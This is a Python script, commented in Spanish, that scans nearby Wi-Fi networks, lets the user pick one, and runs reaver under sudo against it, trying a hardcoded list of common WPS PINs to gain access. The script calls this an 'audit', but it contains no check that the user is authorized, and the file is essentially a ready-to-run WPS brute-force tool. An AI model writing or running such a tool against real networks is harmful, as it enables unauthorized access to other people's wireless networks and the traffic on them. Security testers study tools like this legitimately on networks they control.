import subprocess

# Lista de pines WPS conocidos
WPS_PINS = [
    "12345670", "12345678", "00000000", "11111111", "12345671", "12345679", 
    "55555555", "98765432", "87654321", "43218765"
]

def run_command(command, use_sudo=False):
    """Ejecuta un comando de shell y devuelve la salida."""
    if use_sudo:
        command = f"sudo {command}"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode(), stderr.decode()

def scan_wifi():
    """Escanea redes Wi-Fi y devuelve una lista de SSID y BSSID."""
    print("Escaneando redes Wi-Fi...\n")
    stdout, _ = run_command("iw dev wlan0 scan | grep 'SSID\\|BSSID'")
    networks = []
    lines = stdout.splitlines()
    current_bssid = None
    for line in lines:
        if "BSSID" in line:
            current_bssid = line.split()[-1]
        elif "SSID" in line:
            ssid = line.split(":")[-1].strip()
            if current_bssid and ssid:
                networks.append((ssid, current_bssid))
                current_bssid = None
    return networks

def attempt_wps_attack(bssid, ssid):
    """Intenta conectar usando pines WPS conocidos."""
    print(f"\nIntentando auditoría en la red: {ssid} ({bssid})\n")
    for pin in WPS_PINS:
        print(f"Probando PIN WPS: {pin}")
        stdout, stderr = run_command(f"reaver -i wlan0 -b {bssid} -p {pin} -vv", use_sudo=True)
        if "WPS transaction completed" in stdout or "Success" in stdout:
            print(f"¡Conexión exitosa con PIN: {pin}!")
            return True
    print("No se logró la conexión con los pines conocidos.\n")
    return False

def main():
    # Escanear redes Wi-Fi
    networks = scan_wifi()
    if not networks:
        print("No se encontraron redes Wi-Fi.\n")
        return

    # Mostrar redes disponibles
    print("\nRedes Wi-Fi detectadas:")
    for i, (ssid, bssid) in enumerate(networks, start=1):
        print(f"{i}. SSID: {ssid} | BSSID: {bssid}")

    # Seleccionar red para auditar
    try:
        choice = int(input("\nSelecciona la red para auditar (número): "))
        selected_ssid, selected_bssid = networks[choice - 1]
        print(f"\nRed seleccionada: {selected_ssid} ({selected_bssid})")
    except (ValueError, IndexError):
        print("Selección inválida. Saliendo...")
        return

    # Intentar auditoría WPS
    attempt_wps_attack(selected_bssid, selected_ssid)

if __name__ == "__main__":
    main()


